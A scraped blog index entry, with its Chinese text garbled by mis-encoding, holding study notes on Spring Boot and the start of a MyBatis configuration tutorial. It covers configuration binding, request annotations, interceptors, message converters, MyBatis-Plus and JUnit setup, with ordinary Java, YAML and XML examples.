é…ç½®ç±»ç»„ä»¶ä¹‹é—´æœ‰ä¾èµ–å…³ç³»ï¼Œæ–¹æ³•ä¼šè¢«è°ƒç”¨å¾—åˆ°ä¹‹å‰å•å®ä¾‹ç»„ä»¶ï¼Œç”¨Fullæ¨¡å¼ é…ç½®ç±»é‡Œé¢ä½¿ç”¨@Beanæ ‡æ³¨åœ¨æ–¹æ³•ä¸Šç»™å®¹å™¨æ³¨å†Œç»„ä»¶ï¼Œé»˜è®¤ä¹Ÿæ˜¯å•å®ä¾‹çš„ é…ç½®ç±»æœ¬èº«ä¹Ÿæ˜¯ç»„ä»¶ proxyBeanMethodsï¼šä»£ç†beançš„æ–¹æ³• Full(proxyBeanMethods = true)ã€ã€ä¿è¯æ¯ä¸ª@Beanæ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯å•å®ä¾‹çš„ã€‘ Lite(proxyBeanMethods = false)ã€æ¯ä¸ª@Beanæ–¹æ³•è¢«è°ƒç”¨å¤šå°‘æ¬¡è¿”å›çš„ç»„ä»¶éƒ½æ˜¯æ–°åˆ›å»ºçš„ã€‘ ç»„ä»¶ä¾èµ–å¿…é¡»ä½¿ç”¨Fullæ¨¡å¼é»˜è®¤ã€‚å…¶ä»–é»˜è®¤æ˜¯å¦Liteæ¨¡å¼ @Conditional æ¡ä»¶è£…é…ï¼šæ»¡è¶³ConditionalæŒ‡å®šçš„æ¡ä»¶ï¼Œåˆ™è¿›è¡Œç»„ä»¶æ³¨å…¥ ä½œç”¨åœ¨ç»„ä»¶ä¸Šï¼Œå¦‚æœæ»¡è¶³æ³¨è§£çš„contionalæ¡ä»¶å°±ç”Ÿæ•ˆï¼Œå¦åˆ™å°±ä¸ç”Ÿæ•ˆ @ConfigurationProperties æ³•ä¸€ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 /** * åªæœ‰åœ¨å®¹å™¨ä¸­çš„ç»„ä»¶ï¼Œæ‰ä¼šæ‹¥æœ‰SpringBootæä¾›çš„å¼ºå¤§åŠŸèƒ½ */ @Component @ConfigurationProperties(prefix = \u0026#34;person\u0026#34;) public class Person { private String userName; private Boolean boss; private Date birth; private Integer age; private Pet pet; private String[] interests; private List\u0026lt;String\u0026gt; animal; private Map\u0026lt;String, Object\u0026gt; score; private Set\u0026lt;Double\u0026gt; salarys; private Map\u0026lt;String, List\u0026lt;Pet\u0026gt;\u0026gt; allPets; } æ³•äºŒ\nä¸æ ‡æ³¨@Componentå³ä¸éœ€è¦è®²Personç±»åŠ è½½åˆ°ç»„ä»¶ä¸­\nè¿™æ ·åœ¨éœ€è¦ç»‘å®šçš„æ—¶å€™ï¼Œæ ‡æ³¨æ³¨è§£\n1 2 3 4 5 @EnableConfigurationProperties(Person.class) //1ã€å¼€å¯Personé…ç½®ç»‘å®šåŠŸèƒ½ //2ã€æŠŠè¿™ä¸ªPersonè¿™ä¸ªç»„ä»¶è‡ªåŠ¨æ³¨å†Œåˆ°å®¹å™¨ä¸­ public class MyConfig { } è¿™ä¸ªç»„ä»¶çš„èµ‹å€¼æ˜¯åœ¨é…ç½®æ–‡ä»¶application.propertiesæˆ–application.xmlé‡Œé¢æ‰¾åˆ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 person: birth: 2001/11/1 age: 18 # interests: [ç¯®çƒ,è¶³çƒ] interests: - ç¯®çƒ - è¶³çƒ animal: [é˜¿æ¯›ï¼Œé˜¿ç‹—] score: {english:80,shuxue:90} salarys: - 9999.98 - 9999.91 pet: name: cat weight: 99.2 allPets: sick: - {name: é˜¿ç‹—,weight: 99.99} - name: é˜¿çŒ« weight: 88 - name: é˜¿ä¸¢ weight: 22 health: - {name: é˜¿èŠ±,weight:199.22} - {name: é˜¿æ°´,weight:122.22} user-name: zhangsan boss: true @RestController 1 2 3 4 5 6 7 8 9 10 11 @Target({ElementType.TYPE}) @Retention(RetentionPolicy.RUNTIME) @Documented @Controller @ResponseBody public @interface RestController { @AliasFor( annotation = Controller.class ) String value() default \u0026#34;\u0026#34;; } å®é™…é›†æˆäº†Controllerå’ŒResponseBody æ ‡æ³¨äº†è¯¥ç±»æ˜¯ä¸€ä¸ªç»„ä»¶ï¼Œå¹¶ä¸”è¡¨æ˜çš„ç»“æœä¸ºå­—ç¬¦ä¸²ç›´æ¥è¿”å›åˆ°æµè§ˆå™¨ã€‚ æ™®é€šå‚æ•°æ³¨è§£ @PathVariableã€@RequestHeaderã€@ModelAttributeã€@RequestParamã€@MatrixVariableã€@CookieValueã€@RequestBody\nè¿™äº›æ³¨è§£åœ¨springmvcä¸­å·²ç»äº†è§£è¿‡ï¼Œå°±ä¸åœ¨èµ˜è¿°\n1 2 3 4 5 6 7 8 9 10 11 12 // car/2/owner/zhangsan @GetMapping(\u0026#34;/car/{id}/owner/{username}\u0026#34;) public Map\u0026lt;String,Object\u0026gt; getCar(@PathVariable(\u0026#34;id\u0026#34;) Integer id, @PathVariable(\u0026#34;username\u0026#34;) String name, @PathVariable Map\u0026lt;String,String\u0026gt; pv, @RequestHeader(\u0026#34;User-Agent\u0026#34;) String userAgent, @RequestHeader Map\u0026lt;String,String\u0026gt; header, @RequestParam(\u0026#34;age\u0026#34;) Integer age, @RequestParam(\u0026#34;inters\u0026#34;) List\u0026lt;String\u0026gt; inters, @RequestParam Map\u0026lt;String,String\u0026gt; params, @CookieValue(\u0026#34;_ga\u0026#34;) String _ga, @CookieValue(\u0026#34;_ga\u0026#34;) Cookie cookie){ 3 èµ„æºæ”¾ç½® é™æ€èµ„æºç›®å½•\nåªè¦é™æ€èµ„æºæ”¾åœ¨ç±»è·¯å¾„ä¸‹ï¼š called /static(or/publicor/resourcesor/META-INF/resources`\nè®¿é—® ï¼š å½“å‰é¡¹ç›®æ ¹è·¯å¾„/ + é™æ€èµ„æºå\nåŸç†ï¼š é™æ€æ˜ å°„/**ã€‚\nè¯·æ±‚è¿›æ¥ï¼Œå…ˆå»æ‰¾Controllerçœ‹èƒ½ä¸èƒ½å¤„ç†ã€‚ä¸èƒ½å¤„ç†çš„æ‰€æœ‰è¯·æ±‚åˆéƒ½äº¤ç»™é™æ€èµ„æºå¤„ç†å™¨ã€‚é™æ€èµ„æºä¹Ÿæ‰¾ä¸åˆ°åˆ™å“åº”404é¡µé¢ é…ç½®æ–‡ä»¶ä¿®æ”¹\n1 2 3 4 5 6 spring: mvc: static-path-pattern: /res/** # è¡¨ç¤ºwebè®¿é—®é™æ€èµ„æºçš„è·¯å¾„ resources: static-locations: [classpath:/haha/] # è¡¨ç¤ºé™æ€èµ„æºæœåŠ¡å™¨ç«¯è®¿é—®çš„è·¯å¾„ è‡ªå®šä¹‰ Favicon\nè¿™ä¸ªåªéœ€è¦å°†å›¾ç‰‡å‘½åä¸ºfavicon.ico ï¼Œå°†å…¶æ”¾ç½®åœ¨é™æ€èµ„æºè·¯å¾„ä¸‹å³å¯ 4 å¼‚å¸¸å¤„ç† é»˜è®¤è§„åˆ™ é»˜è®¤æƒ…å†µä¸‹ï¼ŒSpring Bootæä¾›/errorå¤„ç†æ‰€æœ‰é”™è¯¯çš„æ˜ å°„ å¯¹äºæœºå™¨å®¢æˆ·ç«¯ï¼Œå®ƒå°†ç”ŸæˆJSONå“åº”ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯ï¼ŒHTTPçŠ¶æ€å’Œå¼‚å¸¸æ¶ˆæ¯çš„è¯¦ç»†ä¿¡æ¯ã€‚å¯¹äºæµè§ˆå™¨å®¢æˆ·ç«¯ï¼Œå“åº”ä¸€ä¸ªâ€œ whitelabelâ€é”™è¯¯è§†å›¾ï¼Œä»¥HTMLæ ¼å¼å‘ˆç°ç›¸åŒçš„æ•°æ® 5 å¸¸è§ç»„ä»¶å¼•å…¥ å¼•å…¥json å¯¼å…¥jsonä¾èµ–\n1 2 3 4 5 6 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-json\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.3.4.RELEASE\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; å¯¼å…¥è¿™ä¸ªåŒ…ï¼Œè¿”å›çš„å€¼å¦‚æœä¸ºè‡ªå®šä¹‰çš„pojoç±»å‹ï¼Œåˆ™å®¹å™¨å¯ä»¥å°†å…¶å¤„ç†ä¸ºjsonä¹‹åè¿”å›ç»™å®¢æˆ·ç«¯\nå…·ä½“å®ç°æµç¨‹ä»¥åæœ‰æ—¶é—´å†å…·ä½“åˆ†æ æ•´åˆMybatis å¯¼å…¥ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.25\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; mybatis-pluså®é™…ä¸Šå·²ç»æ•´åˆäº†mybatisä¾èµ–\né…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®\né…ç½®æ•°æ®åº“\n1 2 3 4 5 6 7 8 9 spring: datasource: url: jdbc:mysql://localhost:3306/mybatis?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;serverTimezone=UTC\u0026amp;rewriteBatchedStatements=true username: root password: root driver-class-name: com.mysql.cj.jdbc.Driver jdbc: template: query-timeout: 1000 SqlSessionFactory è‡ªåŠ¨é…ç½®å¥½ã€‚åº•å±‚æ˜¯å®¹å™¨ä¸­é»˜è®¤çš„æ•°æ®æº\nmapperLocations è‡ªåŠ¨é…ç½®å¥½çš„ã€‚\næœ‰é»˜è®¤å€¼ã€‚ classpath*:/mapper/**/*.xmlï¼›ä»»æ„åŒ…çš„ç±»è·¯å¾„ä¸‹çš„æ‰€æœ‰mapperæ–‡ä»¶å¤¹ä¸‹ä»»æ„è·¯å¾„ä¸‹çš„æ‰€æœ‰xmléƒ½æ˜¯sqlæ˜ å°„æ–‡ä»¶ã€‚ å»ºè®®ä»¥åsqlæ˜ å°„æ–‡ä»¶ï¼Œæ”¾åœ¨ mapperä¸‹ å•å…ƒæµ‹è¯• ä¾èµ–å¯¼å…¥\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; ä½¿ç”¨é…ç½®éœ€è¦æ ‡æ³¨æ³¨è§£@SpringBootTest\n1 2 3 4 5 6 7 @SpringBootTest class WebAdminApplicationTests { @Test void contextLoads() { } } å¸¸ç”¨æ³¨è§£\n**@Test :**è¡¨ç¤ºæ–¹æ³•æ˜¯æµ‹è¯•æ–¹æ³•ã€‚ä½†æ˜¯ä¸JUnit4çš„@Testä¸åŒï¼Œä»–çš„èŒè´£éå¸¸å•ä¸€ä¸èƒ½å£°æ˜ä»»ä½•å±æ€§ï¼Œæ‹“å±•çš„æµ‹è¯•å°†ä¼šç”±Jupiteræä¾›é¢å¤–æµ‹è¯• **@ParameterizedTest :**è¡¨ç¤ºæ–¹æ³•æ˜¯å‚æ•°åŒ–æµ‹è¯•ï¼Œä¸‹æ–¹ä¼šæœ‰è¯¦ç»†ä»‹ç» **@RepeatedTest :**è¡¨ç¤ºæ–¹æ³•å¯é‡å¤æ‰§è¡Œï¼Œä¸‹æ–¹ä¼šæœ‰è¯¦ç»†ä»‹ç» **@DisplayName :**ä¸ºæµ‹è¯•ç±»æˆ–è€…æµ‹è¯•æ–¹æ³•è®¾ç½®å±•ç¤ºåç§° **@BeforeEach :**è¡¨ç¤ºåœ¨æ¯ä¸ªå•å…ƒæµ‹è¯•ä¹‹å‰æ‰§è¡Œ **@AfterEach :**è¡¨ç¤ºåœ¨æ¯ä¸ªå•å…ƒæµ‹è¯•ä¹‹åæ‰§è¡Œ **@BeforeAll :**è¡¨ç¤ºåœ¨æ‰€æœ‰å•å…ƒæµ‹è¯•ä¹‹å‰æ‰§è¡Œ **@AfterAll :**è¡¨ç¤ºåœ¨æ‰€æœ‰å•å…ƒæµ‹è¯•ä¹‹åæ‰§è¡Œ **@Tag :**è¡¨ç¤ºå•å…ƒæµ‹è¯•ç±»åˆ«ï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Categories **@Disabled :**è¡¨ç¤ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•ä¸æ‰§è¡Œï¼Œç±»ä¼¼äºJUnit4ä¸­çš„@Ignore **@Timeout :**è¡¨ç¤ºæµ‹è¯•æ–¹æ³•è¿è¡Œå¦‚æœè¶…è¿‡äº†æŒ‡å®šæ—¶é—´å°†ä¼šè¿”å›é”™è¯¯ **@ExtendWith :**ä¸ºæµ‹è¯•ç±»æˆ–æµ‹è¯•æ–¹æ³•æä¾›æ‰©å±•ç±»å¼•ç”¨ ç®€å•æ–­è¨€\nç”¨æ¥å¯¹å•ä¸ªå€¼è¿›è¡Œç®€å•çš„éªŒè¯ã€‚å¦‚ï¼š\næ–¹æ³• è¯´æ˜ assertEquals åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ç›¸ç­‰ assertNotEquals åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æˆ–ä¸¤ä¸ªåŸå§‹ç±»å‹æ˜¯å¦ä¸ç›¸ç­‰ assertSame åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ assertNotSame åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡å¼•ç”¨æ˜¯å¦æŒ‡å‘ä¸åŒçš„å¯¹è±¡ assertTrue åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º true assertFalse åˆ¤æ–­ç»™å®šçš„å¸ƒå°”å€¼æ˜¯å¦ä¸º false assertNull åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸º null assertNotNull åˆ¤æ–­ç»™å®šçš„å¯¹è±¡å¼•ç”¨æ˜¯å¦ä¸ä¸º null 6 è‡ªå®šä¹‰ æ ‡æ³¨ä¸€ä¸ªç±»ä¸ºconfiguration ç„¶ååœ¨é‡Œé¢é‡å†™WebMvcConfigureç»„ä»¶ éœ€è¦é‡å†™å“ªä¸ªåŠŸèƒ½ç›´æ¥å®ç°é‡å†™å“ªä¸ªç»„ä»¶ï¼Œæ²¡æœ‰è¢«é‡å†™çš„ç»„ä»¶ç»§ç»­ä½¿ç”¨springbooté»˜è®¤æä¾›çš„ç»„ä»¶ å¦‚æœåŠ å…¥æ³¨è§£@EnableWebMvc é‚£ä¹ˆæ‰€æœ‰çš„ç»„ä»¶éƒ½éœ€è¦é‡å†™ï¼Œä¸é‡å†™ç­‰åŒäºæ²¡æœ‰ä½œç”¨ åœºæ™¯starter - xxxxAutoConfiguration - å¯¼å…¥xxxç»„ä»¶ - ç»‘å®šxxxProperties \u0026ndash; ç»‘å®šé…ç½®æ–‡ä»¶é¡¹ è‡ªå®šä¹‰ MessageConverter å®ç°å¤šåè®®æ•°æ®å…¼å®¹ã€‚jsonã€xmlã€x-reus\n0ã€**@ResponseBody å“åº”æ•°æ®å‡ºå» è°ƒç”¨ RequestResponseBodyMethodProcessor å¤„ç† 1ã€Processor å¤„ç†æ–¹æ³•è¿”å›å€¼ã€‚é€šè¿‡ MessageConverter å¤„ç† 2ã€æ‰€æœ‰ MessageConverter åˆèµ·æ¥å¯ä»¥æ”¯æŒå„ç§åª’ä½“ç±»å‹æ•°æ®çš„æ“ä½œï¼ˆè¯»ã€å†™ï¼‰ 3ã€å†…å®¹åå•†æ‰¾åˆ°æœ€ç»ˆçš„ messageConverterï¼› é¦–å…ˆéœ€è¦å®ç°è‡ªå®šä¹‰çš„messageConverterï¼Œç»§æ‰¿HttpMessageConverå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class ReusMessageConverter implements HttpMessageConverter\u0026lt;Person\u0026gt; { @Override public boolean canRead(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return false; } @Override public boolean canWrite(Class\u0026lt;?\u0026gt; clazz, MediaType mediaType) { return clazz.isAssignableFrom(Person.class); } @Override public List\u0026lt;MediaType\u0026gt; getSupportedMediaTypes() { return MediaType.parseMediaTypes(\u0026#34;application/x-reus\u0026#34;); } @Override public Person read(Class\u0026lt;? extends Person\u0026gt; clazz, HttpInputMessage inputMessage) throws IOException, HttpMessageNotReadableException { return null; } @Override public void write(Person person, MediaType contentType, HttpOutputMessage outputMessage) throws IOException, HttpMessageNotWritableException { // è‡ªå®šä¹‰æ•°æ® String data = person.getUserName()+\u0026#34;;\u0026#34;+person.getAge()+\u0026#34;;\u0026#34;+person.getBirth(); // å†™å‡ºå» OutputStream body = outputMessage.getBody(); body.write(data.getBytes()); } } ç„¶ååœ¨æˆ‘ä»¬çš„WebMvcConfigureä¸­æ·»åŠ æˆ‘ä»¬çš„ç»„ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 @Bean public WebMvcConfigurer webMvcConfigurer(){ return new WebMvcConfigurer() { /** * è‡ªå®šä¹‰å†…å®¹åå•†ç­–ç•¥ * @param configurer */ @Override public void configureContentNegotiation(ContentNegotiationConfigurer configurer) { //Map\u0026lt;String, MediaType\u0026gt; mediaTypes Map\u0026lt;String, MediaType\u0026gt; mediaTypes = new HashMap\u0026lt;\u0026gt;(); mediaTypes.put(\u0026#34;json\u0026#34;,MediaType.APPLICATION_JSON); mediaTypes.put(\u0026#34;xml\u0026#34;,MediaType.APPLICATION_XML); mediaTypes.put(\u0026#34;gg\u0026#34;,MediaType.parseMediaType(\u0026#34;application/x-reus\u0026#34;)); //æŒ‡å®šæ”¯æŒè§£æå“ªäº›å‚æ•°å¯¹åº”çš„å“ªäº›åª’ä½“ç±»å‹ ParameterContentNegotiationStrategy parameterStrategy = new ParameterContentNegotiationStrategy(mediaTypes); // parameterStrategy.setParameterName(\u0026#34;ff\u0026#34;); HeaderContentNegotiationStrategy headeStrategy = new HeaderContentNegotiationStrategy(); configurer.strategies(Arrays.asList(parameterStrategy,headeStrategy)); } // æ·»åŠ æˆ‘ä»¬è‡ªå®šä¹‰çš„MessageConverter @Override public void extendMessageConverters(List\u0026lt;HttpMessageConverter\u0026lt;?\u0026gt;\u0026gt; converters) { converters.add(new ReusMessageConverter()); } } } è‡ªå®šä¹‰æ‹¦æˆªå™¨ ä»¥è¿™ä¸ªæ£€æµ‹ç™»å½•çš„æ‹¦æˆªå™¨ä¸ºä¾‹\nå…ˆåŸºäºHandlerInterceptoræ¥å£ç¼–å†™è‡ªå·±çš„ç™»å½•æ‹¦æˆªå™¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 public class LoginInterceptor implements HandlerInterceptor { /** * ç›®æ ‡æ–¹æ³•æ‰§è¡Œä¹‹å‰ * @param request * @param response * @param handler * @return * @throws Exception */ @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { String requestURI = request.getRequestURI(); log.info(\u0026#34;preHandleæ‹¦æˆªçš„è¯·æ±‚è·¯å¾„æ˜¯{}\u0026#34;,requestURI); //ç™»å½•æ£€æŸ¥é€»è¾‘ HttpSession session = request.getSession(); Object loginUser = session.getAttribute(\u0026#34;loginUser\u0026#34;); if(loginUser != null){ //æ”¾è¡Œ return true; } //æ‹¦æˆªä½ã€‚æœªç™»å½•ã€‚è·³è½¬åˆ°ç™»å½•é¡µ request.setAttribute(\u0026#34;msg\u0026#34;,\u0026#34;è¯·å…ˆç™»å½•\u0026#34;); // re.sendRedirect(\u0026#34;/\u0026#34;); request.getRequestDispatcher(\u0026#34;/\u0026#34;).forward(request,response); return false; } /** * ç›®æ ‡æ–¹æ³•æ‰§è¡Œå®Œæˆä»¥å * @param request * @param response * @param handler * @param modelAndView * @throws Exception */ @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception { log.info(\u0026#34;postHandleæ‰§è¡Œ{}\u0026#34;,modelAndView); } /** * é¡µé¢æ¸²æŸ“ä»¥å * @param request * @param response * @param handler * @param ex * @throws Exception */ @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception { log.info(\u0026#34;afterCompletionæ‰§è¡Œå¼‚å¸¸{}\u0026#34;,ex); } } ç„¶åç»§æ‰¿WebMvcConfigure\n1 2 3 4 5 6 @Override public void addInterceptors(InterceptorRegistry registry) { registry.addInterceptor(new LoginInterceptor()) .addPathPatterns(\u0026#34;/**\u0026#34;) //æ‰€æœ‰è¯·æ±‚éƒ½è¢«æ‹¦æˆªåŒ…æ‹¬é™æ€èµ„æº .excludePathPatterns(\u0026#34;/\u0026#34;,\u0026#34;/login\u0026#34;,\u0026#34;/css/**\u0026#34;,\u0026#34;/fonts/**\u0026#34;,\u0026#34;/images/**\u0026#34;,\u0026#34;/js/**\u0026#34;); } 7 å¼€å‘æŠ€å·§ Lombok åŠ å…¥ä¾èµ–\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; è¯¥ä¾èµ–åŒ…çš„ä½œç”¨æ˜¯æ”¾åˆ°åˆ›å»ºçš„å¯¹è±¡ä¸­ï¼Œå‡å°‘äº†ä»£ç çš„å¤ç”¨ã€‚\n@NoArgsConstructor : æ— å‚æ•°æ„é€  @AllArgsConstructor ï¼š å…¨å‚æ•°æ„é€  @Data ï¼š æä¾›getå’Œsetæ–¹æ³• @ToString ï¼š æä¾›toString @EqualsAndHashCode Spring Initailizrï¼ˆé¡¹ç›®åˆå§‹åŒ–å‘å¯¼ï¼‰ è¿™ä¸ªæ˜¯IEDAæä¾›çš„ åœ¨æ–°å»ºmoduleçš„æ—¶å€™ï¼Œé€‰æ‹©Spring Initializr é€‰æ‹©æˆ‘ä»¬éœ€è¦åŠ å…¥çš„ç»„ä»¶å³å¯ spring-boot-configuration-processor è¿™ä¸ªä¾èµ–åŒ…åŠ å…¥åï¼Œå¯ä»¥æ”¯æŒå¯¹application.yamlé…ç½®æ–‡ä»¶çš„æç¤ºåŠŸèƒ½ï¼Œä¾¿äºç¼–å†™ã€‚ Mybatis plus è¿™ä¸ªç®€åŒ–äº†mapperæ¥å£å’Œxmlçš„åˆ›å»ºå’Œç®€å•å¢åˆ æ”¹æŸ¥çš„å®ç° åªéœ€è¦é€‰ä¸­å¯¹åº”çš„æ•°æ®åº“ ç‚¹å‡»mybatisx-generator,é€‰æ‹©ç›¸å…³é…ç½®å³å¯ã€‚ å¯¹åº”çš„ç®€å•å¢åˆ æ”¹æŸ¥å¯ä»¥ç»§æ‰¿BaseMapper\u0026lt;class\u0026gt;ç±»ä¸­çš„æ–¹æ³•æ¥å®ç° ","permalink":"http://www.reus09.top/posts/tech/springboot/","summary":"å› ä¸ºä¹‹å‰æ¥è§¦äº†ä¸€ç‚¹ssmï¼Œæ‰€ä»¥è¿™é‡Œç®€å•çš„å­¦ä¹ äº†springbootçš„ä¸€äº›ç®€å•ç”¨æ³•ï¼Œå…·ä½“çš„æºç åˆ†æä»¥åæœ‰æ—¶é—´çš„è¯æ…¢æ…¢åˆ†æ è¿™é‡Œç®€å•è°ˆä¸€ä¸‹spri","title":"SpringBoot"},{"content":"MyBatis è¿™é‡Œæ•´ç†äº†MyBatisçš„å¸¸è§ç”¨æ³• Mybatis ä¸»è¦å¯¹æ•°æ®åº“çš„æ“ä½œæä¾›äº†ç»„ä»¶ 1 ç¯å¢ƒæ­å»º å¯¼å…¥ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;!-- Mybatisæ ¸å¿ƒ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.7\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- MySQLé©±åŠ¨ --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.27\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åˆ›å»ºMyBatisçš„æ ¸å¿ƒé…ç½®æ–‡ä»¶\nmybatis-config.xml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;!DOCTYPE configuration PUBLIC \u0026#34;-//mybatis.org//DTD Config 3.0//EN\u0026#34; \u0026#34;http://mybatis.org/dtd/mybatis-3-config.dtd\u0026#34;\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;!-- æ ¸å¿ƒé…ç½®æ–‡ä»¶ä¸­çš„æ ‡ç­¾å¿…é¡»æŒ‰ç…§å›ºå®šçš„é¡ºåº(æœ‰çš„æ ‡ç­¾å¯ä»¥ä¸å†™ï¼Œä½†é¡ºåºä¸€å®šä¸èƒ½ä¹±)ï¼š propertiesã€settingsã€typeAliasesã€ typeHandlersã€objectFactoryã€ objectWrapperFactoryã€reflectorFactoryã€ pluginsã€environmentsã€databaseIdProviderã€ mappers --\u0026gt; \u0026lt;!-- å¼•å…¥ jdbcçš„é…ç½®æ–‡ä»¶ --\u0026gt; \u0026lt;properties resource=\u0026#34;jdbc.properties\u0026#34;/\u0026gt; \u0026lt;!-- è®¾ç½®Mybatis çš„å…¨å±€é…ç½®--\u0026gt; \u0026lt;settings\u0026gt; \u0026lt;!--å°†è¡¨ä¸­å­—æ®µçš„ä¸‹åˆ’çº¿è‡ªåŠ¨è½¬æ¢ä¸ºé©¼å³°--\u0026gt; \u0026lt;setting name=\u0026#34;mapUnderscoreToCamelCase\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;!--å¼€å¯å»¶è¿ŸåŠ è½½--\u0026gt; \u0026lt;setting name=\u0026#34;lazyLoadingEnabled\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/settings\u0026gt; \u0026lt;!-- è®¾ç½®ç±»å‹åˆ«å--\u0026gt; \u0026lt;typeAliases\u0026gt; \u0026lt;!--typeAlias è®¾ç½®ç±»å‹åˆ«å type alias : è®¾ç½®æŸä¸ªç±»å‹çš„åˆ«åï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå›ºå®šçš„ç±»å --\u0026gt; \u0026lt;!-- \u0026lt;typeAlias type=\u0026#34;com.reus.mybatis.pojo.User\u0026#34; alias = \u0026#34;User\u0026#34;\u0026gt;\u0026lt;/typeAlias\u0026gt;--\u0026gt; \u0026lt;!-- ä»¥åŒ…ä¸ºå•ä½ ï¼Œå°†åŒ…ä¸‹çš„æ‰€æœ‰æ•°æ®è®¾ç½®ä¸ºé»˜è®¤çš„ç±»å‹åˆ«åï¼Œå³ç±»åä¸åŒºåˆ†å¸¦å¤§å°å†™ --\u0026gt; \u0026lt;package name=\u0026#34;com.reus.mybatis.pojo\u0026#34;/\u0026gt; \u0026lt;/typeAliases\u0026gt; \u0026lt;plugins\u0026gt; \u0026lt;!--è®¾ç½®åˆ†é¡µæ’ä»¶--\u0026gt; \u0026lt;plugin interceptor=\u0026#34;com.github.pagehelper.PageInterceptor\u0026#34;\u0026gt;\u0026lt;/plugin\u0026gt; \u0026lt;/plugins\u0026gt; \u0026lt;!-- environments:é…ç½®å¤šä¸ª æ•°æ®åº“çš„ç¯å¢ƒ å±æ€§ï¼š default: é»˜è®¤ä½¿ç”¨çš„ç¯å¢ƒçš„Id --\u0026gt; \u0026lt;environments default=\u0026#34;development\u0026#34;\u0026gt; \u0026lt;!-- é…ç½®å…·ä½“çš„ç¯å¢ƒ å±æ€§: id, å”¯ä¸€æ ‡è¯† asd --\u0026gt; \u0026lt;environment 